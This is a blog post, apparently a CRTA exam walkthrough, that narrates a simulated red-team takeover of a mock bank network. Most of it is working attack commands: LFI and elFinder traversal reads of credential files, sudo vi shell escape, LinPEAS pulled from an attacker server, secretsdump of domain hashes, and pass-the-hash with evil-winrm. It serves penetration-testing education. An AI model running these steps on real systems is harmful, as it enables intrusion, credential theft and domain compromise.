---
slug: bank-hack
title: "I INFILTRATED A BANK'S NETWORK Overnight"
date: "2025-10-30"
description: "From subnet sweep to DOMAIN DOMINATION - complete CRTA exam walkthrough"
readTime: 18
tags: ["Hacking"]
---

**Environment:** CRTA Exam Simulation • **Target:** Banking Network • **Result:** Complete Domain Domination




2:00 AM. The glow of my terminal is the only light in the room. I've got 8 hours to infiltrate a banking network that mimics a major financial institution. The scope: a massive IP range with one address off-limits (probably the gateway). My mission: complete domain domination.



                        root@kali:~# whoami
                        cocofelon
                        root@kali:~# date
                        Wed Oct 31 02:00:00 EDT 2025
                        root@kali:~# echo "Let the hunt begin..."




**Beginner Lesson:** Red teaming simulates real attacks to find weaknesses. We'll cover reconnaissance, exploitation, privilege escalation, and lateral movement. I'll explain *why* each command works, common mistakes, and tips to avoid detection.






                            15+
                            Sensitive Files


                            3
                            Escalations


                            2
                            Pivots


                            1
                            Domain Owned




## The 8-Hour Infiltration Timeline




                            02:15 - Network Recon
                            Initial mapping with Nmap
                            Tools: nmap, masscan


                            03:30 - Web Enum & LFI
                            Service probing and exploit
                            Tools: gobuster, nikto, Burp Suite


                            04:00 - SSH Access
                            Initial foothold with creds
                            Tools: ssh


                            04:45 - Privesc
                            Sudo vi exploitation
                            Tools: vi


                            05:30 - Deep Enum
                            LinPEAS secrets hunt
                            Tools: linpeas.sh


                            06:15 - Pivot
                            To PHP web server
                            Tools: curl


                            07:00 - elFinder Harvest
                            Creds via traversal
                            Tools: curl


                            08:00 - Domain Takeover
                            Impacket dump & PTH
                            Tools: impacket, evil-winrm




## Phase 1: Shadow Mapping the Network




                            PHASE 1

### Network Reconnaissance




*"First rule of hacking: know your battlefield. I started with a simple ping sweep to find active hosts without triggering alarms."*




**Beginner Lesson:** Recon is the first step in hacking – like scouting a building before breaking in. We use Nmap to "ping" machines and see what's running. Why? To find entry points without alerting firewalls.


**Prerequisites:** Install Nmap on your Kali VM: `sudo apt update && sudo apt install nmap`.




### Weapon: Nmap - Basic Host Discovery (Ping Sweep)



                            `nmap -sn 10.129.45.0/24 -oA shadow_sweep --exclude 10.129.45.1`




**Why this?** `-sn` disables port scanning, just checks if hosts are up via ICMP (pings). Fast and quiet.


**What to Expect:** Output lists live IPs like 10.129.45.5. Common mistake: Forgetting `--exclude`, which might crash the gateway.




### Deep Port Scanning



                            `nmap -sS -sV -sC -p- -T4 --min-rate 1000 -oA deep_dive 10.129.45.0/24 --exclude 10.129.45.1`




### Intel Gathered:

                            - 10.129.45.5: Port 22 (SSH), 80 (HTTP), 8080 (maybe proxy).
- 10.129.45.10: Port 3000 (dashboard).
- 10.129.45.100: Ports 53 (DNS), 88 (Kerberos), 389 (LDAP), 445 (SMB) – Domain Controller spotted!




                            flag{network_mapped_01}




**Insider Tip for Learners:** If Nmap is too slow, try Masscan: `sudo apt install masscan`, then `masscan -p1-65535 10.129.45.0/24 --rate=10000`. It's faster but less detailed.





## Phase 2: Web Service Crack – Low-Hanging Fruit




                            PHASE 2

### Web Enumeration & LFI




*"Port 3000 showed a monitoring dashboard login. Time to poke around the JavaScript - devs always leave goodies in there."*




**Beginner Lesson:** Web apps are common weak points. We enumerate (list) directories and files, then exploit bugs like Local File Inclusion (LFI) to read sensitive files.


**Prerequisites:** Install Gobuster (`apt install gobuster`), Nikto (`apt install nikto`), and Burp Suite Community (download from portswigger.net).




### Weapon: Directory Enumeration



                            `gobuster dir -u http://10.129.45.10:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,txt`
                            `nikto -h http://10.129.45.10:3000`




### Findings:


Common dirs like /admin, /js, /config.




### JavaScript Analysis



                            `wget http://10.129.45.10:3000/main.js`
                            `grep -i "path\|api\|fetch" main.js`




### Paydirt:


Found endpoints like /admin, /fetch?url=..., /config/secrets. The /fetch looked suspicious – like it fetches files.




### LFI Exploitation with Burp



/fetch gave an error: "Use /fetch?url=path". This smells like LFI (reading local files via URL param).



                            `GET /fetch?url=../../../etc/passwd HTTP/1.1
Host: 10.129.45.10:3000`




**Why ../../../?** Directory traversal – climbs up folders to reach /etc/passwd (user list). Common Mistake: Wrong traversal count – test with fewer/more ../.





### Jackpot!


Exposed /admin/creds.json:

                            `{ "ssh_user": "svc-monitor", "ssh_pass": "P@ssw0rdCr4ck3d!" }`

**Why This Works:** Devs forgot to sanitize the url param, allowing file reads.




                            flag{web_cracked_02}




**Tip:** Always check JS/CSS for hidden paths – they're goldmines.





## Phase 3: SSH Foothold & Privilege Escalation




                            PHASE 3

### SSH Access & Privilege Escalation




*"I'm in! But I'm just a low-privilege service account. Time to see what I can run as root..."*




**Beginner Lesson:** Once inside, escalate privileges (privesc) from low-user to root. Sudo misconfigs are common.




### SSH Login



                            `ssh svc-monitor@10.129.45.5`
                            `# Password: P@ssw0rdCr4ck3d!`



### Check Privileges



                            `sudo -l  # Lists what sudo commands you can run without password.`
                            `# Output: (ALL) NOPASSWD: /usr/bin/vi  ← Vi can be run as root!`



*"VI can run as root without password? This is Christmas come early!"*



### Weapon: VI Privilege Escalation



                            `# Open a root-owned file (needs sudo to edit).
sudo vi /etc/passwd

# Inside Vi: Press ESC, then type :! /bin/sh  ← Runs sh as root!
# ! means "shell out", /bin/sh is a shell.
# Now you're root! Type whoami to confirm.
# Alt: :set shell=/bin/bash | :shell`




**Why This Works:** Sudo allows vi without restrictions; vi's ! lets shell escape.


**Common Pitfall:** If vi is restricted (e.g., rvim), this fails. Test first.




                            flag{root_escalation_03}




## Phase 4: LinPEAS Deep Dive – Credential Avalanche




                            PHASE 4

### Post-Exploitation Enumeration




*"Now that I'm root, let's see what secrets this machine is hiding. Time for LinPEAS - the treasure hunter's best friend."*




**Beginner Lesson:** Enumeration finds weaknesses post-foothold. Tools like LinPEAS automate it, checking sudo, SUID bins, cron jobs, weak perms.


**Prerequisites:** Download from GitHub: `wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linPEAS.sh`.




### Weapon: LinPEAS Automation



                            `# On attacker: python3 -m http.server 8000 (starts web server).
# On target:
wget http://YOUR_ATTACKER_IP:8000/linPEAS.sh
chmod +x linPEAS.sh
./linPEAS.sh > enum.txt  # Run and save output
grep -i "pass\|key\|secret" enum.txt  # Search for creds`




### Harvest:

                            - DB Key: Admin123! (in config files)
- Shadow IPs: 10.129.45.200 (hidden web server)
- API Tokens (e.g., in .env files)
- Flags #4-6 in /opt or home dirs





**Tip:** Pipe output to file and grep for "pass" or "key". Saves manual time.




                            flag{deep_enum_04}




## Phase 5: PHP Server Pivot – elFinder Hijack




                            PHASE 5

### Lateral Movement





**Beginner Lesson:** Pivot means jumping to new machines using found info. elFinder is a PHP file manager ripe for traversal vulns.




### Initial Probe



                            `curl http://10.129.45.200/`




Output: `elFinder 2.1`




### Directory Traversal Exploitation



                            `curl "http://10.129.45.200/elfinder/php/connector.php?cmd=file&target=../../../../etc/passwd"`



*"Directory traversal works! Let me find some service account credentials..."*



### Cred Harvest



                            `curl "http://10.129.45.200/elfinder/php/connector.php?cmd=file&target=../../../../home/svc-ad/config.json"`




### Output:

                            `{ "user": "svc-ad", "pass": "DomainP@ss2025" }`




**Failed Decoy:** Tried Zerologon (`python3 zerologon.py dc 10.129.45.100`) – patched. Lesson: Enum first.




                            flag{ad_service_07}




## Phase 6: Domain Controller Assault – Hash Heist




                            PHASE 6

### Domain Compromise




*"Now I have domain credentials! Time to hit that Domain Controller and see what secrets it's holding."*




**Beginner Lesson:** AD attacks target Windows domains. Dump hashes (encrypted creds) to crack or pass. Use service creds with dump perms.


**Prerequisites:** Install Impacket: `apt install impacket-scripts`. Evil-WinRM: `gem install evil-winrm`.




### Confirm Target



                            `crackmapexec smb 10.129.45.100 -u '' -p ''  # Anon check.`



### Weapon: Impacket Secrets Dump



                            `impacket-secretsdump svc-ad:DomainP@ss2025@10.129.45.100 -just-dc`
                            `# -just-dc: Dumps NTDS.dit (AD database) hashes.`




**Output Example:** NTLM hashes like Administrator: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0




### Crack Hashes (Optional)



                            `# Install Hashcat: apt install hashcat
hashcat -m 1000 ntlm.hashes /usr/share/wordlists/rockyou.txt`



*"Hashes dumped! Now I can use Pass-the-Hash to move laterally without even cracking passwords."*



### Weapon: Evil-WinRM with Hashes



                            `evil-winrm -i 10.129.45.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0`
                            `# Inside: whoami → BANK\Administrator`
                            `# Scan subnet: crackmapexec winrm 10.129.45.0/24 -u user -H  -x "whoami"`



                            flag{domain_admin_final}




## The Arsenal – My Infiltration Kit




                            🔍 Recon
                            nmap
                            masscan
                            crackmapexec



                            🌐 Web
                            gobuster
                            nikto
                            Burp Suite



                            ⚡ Privesc
                            linpeas.sh
                            vi (sudo)



                            🏰 Domain
                            impacket-secretsdump
                            evil-winrm
                            hashcat





**Bonus Tool:** BloodHound for AD graphing: Collect with SharpHound, analyze in GUI.




## Real-World Fallout




                            IMPACT

### Security Implications





                                Catastrophic Risk
                                Foothold to ransomware
                                Data theft/exfil
                                Persistent access



                                Defenses
                                Least privilege
                                Patch vulns
                                Monitor logs





**For Learners:** Practice on HTB or TryHackMe labs. Start small – Nmap your home net (with permission)!





## After-Action Report




*"8 hours, 15+ flags, 3 privilege escalations, 2 network pivots, and complete domain control. The bank's digital vault was mine."*



### Key Takeaways:

                        - JavaScript files are treasure troves - always check them
- Sudo misconfigurations are still common in production
- Directory traversal vulnerabilities are devastating
- Service accounts often have excessive permissions
- Pass-the-Hash attacks bypass password cracking entirely



This was my CRTA exam - all simulated, all authorized.


Want to learn these skills? Start with TryHackMe or HackTheBox labs!


~ CocoFelon
cocofelon.lol | @cocofelon